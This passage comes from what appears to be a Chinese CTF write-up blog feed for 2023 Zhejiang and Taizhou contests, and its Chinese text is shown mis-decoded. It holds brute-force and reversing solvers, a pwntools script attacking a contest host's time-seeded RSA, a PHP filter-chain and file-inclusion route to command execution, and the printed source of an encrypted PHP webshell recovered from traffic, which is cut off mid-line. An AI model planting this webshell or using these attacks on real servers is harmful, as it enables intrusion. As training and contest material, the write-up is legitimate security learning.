class="hljs-number">80</span>-<span class="hljs-number">27</span>)<br>a.append(<span class="hljs-number">5</span>*<span class="hljs-number">25</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure>




<h2 id="åˆèµ›-An-EaSy-Cipher"><a href="#åˆèµ›-An-EaSy-Cipher" class="headerlink" title="åˆèµ›[An EaSy Cipher]"></a>åˆèµ›[An EaSy Cipher]</h2><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">[&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08ã€‚RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;,&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;]<br></code></pre></td></tr></table></figure>

<p>æç¤ºï¼š<code>ECB 0 128 six numbers</code></p>
<p>å†™è„šæœ¬çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">c=<span class="hljs-string">&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;</span><br>key=<span class="hljs-string">&quot;RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;</span><br><br><span class="hljs-comment">#mcryptæ˜¯è‡ªå®šä¹‰çš„æ¨¡å—ï¼ŒåŒ…å«aes</span><br><span class="hljs-keyword">from</span> mcrypt.boom <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> mcrypt.base <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> mcrypt.aes <span class="hljs-keyword">import</span> *<br>base=<span class="hljs-string">&quot;0123456789&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Gendic(base,<span class="hljs-number">6</span>,<span class="hljs-literal">True</span>):<br>    a=aes(<span class="hljs-string">&#x27;&#x27;</span>.join(i),Pad_type=<span class="hljs-number">1</span>)<br>    data=a.decrypt(b64().decode(c))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>),i)<br>        f.write(data)<br>        f.write(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        f.flush()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023zhejiang-14.png"></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="åˆèµ›-pyccc"><a href="#åˆèµ›-pyccc" class="headerlink" title="åˆèµ›[pyccc]"></a>åˆèµ›[pyccc]</h2><p>ä½¿ç”¨pycdcåç¼–è¯‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Source Generated with Decompyle++</span><br><span class="hljs-comment"># File: baby.pyc (Python 3.8)</span><br><br>a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please input your flag:\n&#x27;</span>)<br>check = [<br>    <span class="hljs-number">102</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">88</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">122</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">120</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">98</span>,<br>    <span class="hljs-number">39</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">106</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-number">24</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">if</span> check[i] == <span class="hljs-built_in">ord</span>(a[i]) ^ i:<br>            <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(yes)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">check = [<br>    <span class="hljs-number">102</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">88</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">122</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">120</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">98</span>,<br>    <span class="hljs-number">39</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">106</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(check)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(check[i] ^ i), end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure>


<h2 id="åˆèµ›-easyapk"><a href="#åˆèµ›-easyapk" class="headerlink" title="åˆèµ›[easyapk]"></a>åˆèµ›[easyapk]</h2><p>å¯†æ–‡æ˜¯<code>HPjVMiy4FxSPc1n0eq52t4jaZ7FNr/qvJMjkusqbG6t8IVzztqflA0VQmVZYgiaC</code>ï¼Œivæ˜¯<code>0123456789ABCDEF</code></p>
<p><img src="/img/wp/2023/2023zhejiang-15.png"></p>
<p>å¯†é’¥ä¸­eæ›¿æ¢æˆ3</p>
<p><code>final String replaceAll = &quot;reversecarefully&quot;.replaceAll(&quot;e&quot;, &quot;3&quot;);</code></p>
<p>åŠ å¯†æ¨¡å¼æ˜¯AES</p>
<p><img src="/img/wp/2023/2023zhejiang-16.png"></p>
<p><img src="/img/wp/2023/2023zhejiang-17.png"></p>
<h2 id="åˆèµ›-luare"><a href="#åˆèµ›-luare" class="headerlink" title="åˆèµ›[luare]"></a>åˆèµ›[luare]</h2><p>å…ˆå¯¼å‡ºluaçš„å­—èŠ‚ç </p>
<p><img src="/img/wp/2023/2023zhejiang-18.png"></p>
<p>ä¿®è¡¥æ–‡ä»¶å¤´ä¸º<code>1B 4C 7561 52</code>ï¼Œå…¶ä¸­52æ˜¯ç‰ˆæœ¬å·</p>
<p><img src="/img/wp/2023/2023zhejiang-19.png"></p>
<p>ä½¿ç”¨unluacåç¼–è¯‘</p>
<p><code>java -jar unluac.jar out &gt; out.lua</code></p>
<p>å¾—åˆ°</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CheckAns</span><span class="hljs-params">(data)</span></span><br>  <span class="hljs-keyword">if</span> #data ~= <span class="hljs-number">40</span> <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>  <span class="hljs-keyword">end</span><br>  dataOut = Oo00Oo0(data)<br>  enc = &#123;<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-72</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-5</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">-100</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">32</span>,<br>    <span class="hljs-number">-76</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">20</span>,<br>    <span class="hljs-number">-61</span>,<br>    <span class="hljs-number">-56</span>,<br>    <span class="hljs-number">-119</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">36</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">82</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">95</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">-80</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">-89</span>,<br>    <span class="hljs-number">89</span>,<br>    <span class="hljs-number">-85</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">7</span>,<br>    <span class="hljs-number">127</span><br>  &#125;<br>  i = <span class="hljs-number">1</span><br>  <span class="hljs-keyword">while</span> i &lt;= #dataOut <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> dataOut[i] ~= enc[i] <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    i = i + <span class="hljs-number">1</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;input: &quot;</span>)<br><span class="hljs-keyword">local</span> data = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>()<br><span class="hljs-keyword">if</span> CheckAns(data) <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;true&quot;</span>)<br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;false&quot;</span>)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>åˆ†æ<code>Oo00Oo0</code>å‡½æ•°ï¼Œç®€å•å¼‚æˆ–</p>
<p><img src="/img/wp/2023/2023zhejiang-20.png"></p>
<p>è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">v7=[<span class="hljs-number">0</span>]*<span class="hljs-number">32</span><br>v7= [<span class="hljs-number">0x60856D1028C8953C</span>,<span class="hljs-number">0x964849764CB30359</span>,<span class="hljs-number">0x2E7164C479B75FB8</span>,<span class="hljs-number">0x80637291A7AC8C38</span>,<span class="hljs-number">0x7B8BF3AE4B339EB0</span>,\<br>    <span class="hljs-number">0xCFE06FEC52B45B4D</span>,<span class="hljs-number">0x5DC67EAAB20C3AD</span>,<span class="hljs-number">0x24FCFBD656409F00</span>,<span class="hljs-number">0x4AF00D463D0BCA92</span>,<span class="hljs-number">0x7DBC8A3B1A11555A</span>,<span class="hljs-number">0x3061CE7513A9E76C</span>,\<br>    <span class="hljs-number">0x9C54D007276AA614</span>,<span class="hljs-number">0x34C20158D8898E5C</span>,<span class="hljs-number">0x50A02AC02F3569E8</span>,<span class="hljs-number">0xC0E681D39FF8836</span>,<span class="hljs-number">0xB66E7F18FEB1E693</span>,\<br>    <span class="hljs-number">0x29F5D2E92B315378</span>,<span class="hljs-number">0x41D9DBDE84172C0F</span>,<span class="hljs-number">0x7A45A899A1F71906</span>,<span class="hljs-number">0xE5AA0AAF1BA5233E</span>,<span class="hljs-number">0x9A3A82FAF8E1A4EF</span>,\<br>    <span class="hljs-number">0xC1D173C7651C8FDF</span>,<span class="hljs-number">0x8D9DDD875EA2D7C5</span>,<span class="hljs-number">0x66EE9790CD81C9F9</span>,<span class="hljs-number">0x370874C63F424FDA</span>,<span class="hljs-number">0xB93283E32677CB25</span>,\<br>    <span class="hljs-number">0xBA2D4ED544F2D3BD</span>,<span class="hljs-number">0xBFE421121E049862</span>,<span class="hljs-number">0xA31694FDF486F647</span>,<span class="hljs-number">0x430251B27C701FEB</span>,<span class="hljs-number">0x5DE26B097ECC1522</span>,<span class="hljs-number">0xF157EDD4B5BE9BBB</span>]<br>table=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v7:<br>  table+=i.to_bytes(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>table=<span class="hljs-built_in">list</span>(table)<br>enc=[<span class="hljs-number">109</span>,-<span class="hljs-number">73</span>,-<span class="hljs-number">72</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">73</span>,-<span class="hljs-number">5</span>,<span class="hljs-number">99</span>,-<span class="hljs-number">100</span>,<span class="hljs-number">46</span>,<span class="hljs-number">59</span>,<span class="hljs-number">32</span>,-<span class="hljs-number">76</span>,<span class="hljs-number">109</span>,<span class="hljs-number">3</span>,<span class="hljs-number">59</span>,<span class="hljs-number">20</span>,-<span class="hljs-number">61</span>,-<span class="hljs-number">56</span>,\<br>     -<span class="hljs-number">119</span>,<span class="hljs-number">48</span>,<span class="hljs-number">100</span>,<span class="hljs-number">118</span>,<span class="hljs-number">36</span>,<span class="hljs-number">118</span>,<span class="hljs-number">82</span>,<span class="hljs-number">3</span>,<span class="hljs-number">95</span>,<span class="hljs-number">106</span>,<span class="hljs-number">14</span>,-<span class="hljs-number">80</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">89</span>,<span class="hljs-number">89</span>,-<span class="hljs-number">85</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">73</span>,<span class="hljs-number">7</span>,<span class="hljs-number">127</span>]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(enc):<br>  enc[i]=v&amp;<span class="hljs-number">0xff</span><br><br>flag=[]<br>flag.insert(<span class="hljs-number">0</span>,table.index(enc[-<span class="hljs-number">1</span>]))<br>ind=<span class="hljs-built_in">len</span>(enc)-<span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> ind&gt;=<span class="hljs-number">0</span>:<br>  flag.insert(<span class="hljs-number">0</span>,table.index(enc[ind])^flag[<span class="hljs-number">0</span>])<br>  ind-=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))<br></code></pre></td></tr></table></figure>


<h2 id="å†³èµ›-Ez8or"><a href="#å†³èµ›-Ez8or" class="headerlink" title="å†³èµ›[Ez8or]"></a>å†³èµ›[Ez8or]</h2><p>åŠ å¯†æ•°æ®å†æ¬¡å¼‚æˆ–åå¾—åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>a=[  <span class="hljs-number">168</span>, <span class="hljs-number">172</span>,  <span class="hljs-number">54</span>, <span class="hljs-number">106</span>, <span class="hljs-number">196</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">154</span>, <span class="hljs-number">220</span>,  <span class="hljs-number">18</span>,  <span class="hljs-number">72</span>,<br>  <span class="hljs-number">242</span>,  <span class="hljs-number">96</span>, <span class="hljs-number">203</span>, <span class="hljs-number">204</span>,  <span class="hljs-number">58</span>,  <span class="hljs-number">94</span>, <span class="hljs-number">242</span>,  <span class="hljs-number">99</span>, <span class="hljs-number">156</span>, <span class="hljs-number">148</span>,<br>  <span class="hljs-number">245</span>,  <span class="hljs-number">72</span>, <span class="hljs-number">205</span>,  <span class="hljs-number">23</span>, <span class="hljs-number">130</span>, <span class="hljs-number">205</span>, <span class="hljs-number">247</span>, <span class="hljs-number">113</span>, <span class="hljs-number">159</span>,  <span class="hljs-number">54</span>,<br>  <span class="hljs-number">180</span>, <span class="hljs-number">136</span>, <span class="hljs-number">175</span>,  <span class="hljs-number">95</span>, <span class="hljs-number">221</span>, <span class="hljs-number">100</span>, <span class="hljs-number">133</span>, <span class="hljs-number">150</span>, <span class="hljs-number">247</span>,  <span class="hljs-number">94</span>,<br>  <span class="hljs-number">196</span>,   <span class="hljs-number">9</span>, <span class="hljs-number">173</span>, <span class="hljs-number">221</span>, <span class="hljs-number">171</span>,  <span class="hljs-number">22</span>, <span class="hljs-number">153</span>,  <span class="hljs-number">96</span>, <span class="hljs-number">155</span>, <span class="hljs-number">222</span>,<br>  <span class="hljs-number">245</span>,  <span class="hljs-number">83</span>, <span class="hljs-number">195</span>,  <span class="hljs-number">33</span>, <span class="hljs-number">252</span>, <span class="hljs-number">128</span>, <span class="hljs-number">248</span>,  <span class="hljs-number">16</span>, <span class="hljs-number">199</span>,  <span class="hljs-number">38</span>]<br><br>p=process(<span class="hljs-string">&quot;./Ez8or&quot;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;bp $rebase(0x1476)&#x27;</span>)<br><span class="hljs-comment"># ä¿®æ”¹åŠ å¯†å‡½æ•°çš„å‚æ•°ä¸ºå¯†æ–‡åœ°å€ï¼Œå‡½æ•°ç»“æŸåï¼ŒæŸ¥çœ‹å¯†æ–‡åœ°å€å¤„å‚¨å­˜çš„ä¿¡æ¯</span><br>pause()<br>p.sendline(<span class="hljs-built_in">bytes</span>(a))<br>p.interactive()<br></code></pre></td></tr></table></figure>


<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="å†³èµ›-SafeNote"><a href="#å†³èµ›-SafeNote" class="headerlink" title="å†³èµ›[SafeNote]"></a>å†³èµ›[SafeNote]</h2><p>ä¼ªéšæœºæ•°ï¼Œå…ˆè·å–å¯†æ–‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> CDLL<br><br>lib=CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>p=process(<span class="hljs-string">&quot;SafeNote&quot;</span>)<br>i=<span class="hljs-number">96</span><br><span class="hljs-keyword">while</span> i&gt;<span class="hljs-number">0</span>:<br>    p=remote(<span class="hljs-string">&quot;10.1.101.234&quot;</span>,<span class="hljs-number">9999</span>)<br>    t=lib.time(<span class="hljs-number">0</span>)<br>    p1=process(<span class="hljs-string">&quot;./a.out&quot;</span>)<br>    p1.sendline(<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&quot;N =&quot;</span>)<br>    d2=<span class="hljs-built_in">int</span>(p.readline())<br>    p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.readuntil(<span class="hljs-string">&quot;password = &quot;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline().strip().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    p1.send(<span class="hljs-built_in">str</span>(d))<br>    p1.readuntil(<span class="hljs-string">&#x27;n:&#x27;</span>)<br>    d1=<span class="hljs-built_in">int</span>(p1.readline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>).strip())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(1): &quot;</span>+<span class="hljs-built_in">str</span>(d2))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(2): &quot;</span>+<span class="hljs-built_in">str</span>(d1))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nu: &quot;</span>+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &quot;</span>+<span class="hljs-built_in">str</span>(t))<br>    <span class="hljs-keyword">if</span> d2!=d1:<br>        p.close()<br>        p1.close()<br>        i-=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br>p1.readuntil(<span class="hljs-string">&#x27;data:&#x27;</span>)<br>d=p1.readline()<br><span class="hljs-built_in">print</span>(d)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>rsaè§£å¯†å¾—åˆ°passwordï¼Œç„¶åå°†passwordå‘é€ç»™é¶æœºå¾—åˆ°flag</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;gmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">gmp_randstate_t</span> gmp_state;<br>__mpz_struct p,q,n_,e,p_1,q_1,lambda,d_;<br>__mpz_struct secret,msg;<br><span class="hljs-type">char</span>* data,data1;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	data=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>	data1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>	__gmpz_inits(&amp;p,&amp;q,&amp;n_,&amp;e,&amp;p_1,&amp;q_1,&amp;lambda,&amp;d_,&amp;secret,&amp;msg,<span class="hljs-number">0</span>);<br>	__gmp_randinit_mt(&amp;gmp_state);<br>	<span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>	<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,&amp;num);<br>	__gmp_randseed_ui(&amp;gmp_state,time(<span class="hljs-number">0</span>)+num);<br>	__gmpz_urandomb(&amp;q,&amp;gmp_state,<span class="hljs-number">256</span>);<br>	__gmpz_nextprime(&amp;q,&amp;q);<br>	__gmpz_urandomb(&amp;p,&amp;gmp_state,<span class="hljs-number">256</span>);<br>	__gmpz_nextprime(&amp;p,&amp;p);<br>	 __gmpz_mul(&amp;n_, &amp;p, &amp;q);<br>	  __gmpz_set_ui(&amp;e, <span class="hljs-number">65537LL</span>);<br>	  __gmpz_sub_ui(&amp;p_1, &amp;p, <span class="hljs-number">1LL</span>);<br>	  __gmpz_sub_ui(&amp;q_1, &amp;q, <span class="hljs-number">1LL</span>);<br>	  __gmpz_lcm(&amp;lambda, &amp;p_1, &amp;q_1);<br>	  __gmpz_invert(&amp;d_, &amp;e, &amp;lambda);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;n: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;n_));<br>	read(<span class="hljs-number">0</span>,data,<span class="hljs-number">0x100</span>);<br>	__gmpz_set_str(&amp;secret,data,<span class="hljs-number">10</span>);<br>	__gmpz_powm(&amp;msg,&amp;secret,&amp;d_,&amp;n_);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;msg));<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023</tag>
        <tag>æµ™æ±Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>2023å°å·å¸‚ç¬¬ä¸‰å±Šç½‘ç»œå®‰å…¨å¤§èµ›wp</title>
    <url>/posts/8779ab40/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="briefphp"><a href="#briefphp" class="headerlink" title="briefphp"></a>briefphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!--&lt;a href=<span class="hljs-string">&quot;/?source&quot;</span>&gt;source&lt;/a&gt;--&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>)  <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./shell.php&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;!DOCTYPE&#x27;</span>) === False) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed to read&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nothing here&#x27;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span> nothing here<br></code></pre></td></tr></table></figure>

<p>åªèƒ½è¯»å–ä»¥<code>&lt;!DOCTYPE</code>å¼€å¤´çš„æ–‡ä»¶ï¼Œç›´æ¥ç”¨<code>php_filter_chain_generator</code>æ„é€ </p>
<p><img src="/img/wp/2023/2023taizhou-1.png"></p>
<p>è¯»å–shell.php</p>
<p><img src="/img/wp/2023/2023taizhou-2.png"></p>
<p>ç„¶åæ–‡ä»¶åŒ…å«è½¬å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="/img/wp/2023/2023taizhou-3.png"></p>
<p>èšå‰‘è¿æ¥æ‹¿åˆ°flag</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="è¿™æ˜¯ç¥é©¬"><a href="#è¿™æ˜¯ç¥é©¬" class="headerlink" title="è¿™æ˜¯ç¥é©¬"></a>è¿™æ˜¯ç¥é©¬</h2><p>æµé‡åˆ†æï¼Œå¯¼å‡ºhttpå¯¹è±¡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>	<span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;144a6b2296333602&quot;</span>;<br>	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>	<span class="hljs-title function_ invoke__">session_write_close</span>();<br>	<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>	&#123;<br>		<span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>		<span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br>		<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>    			 <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>    			&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>	&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span 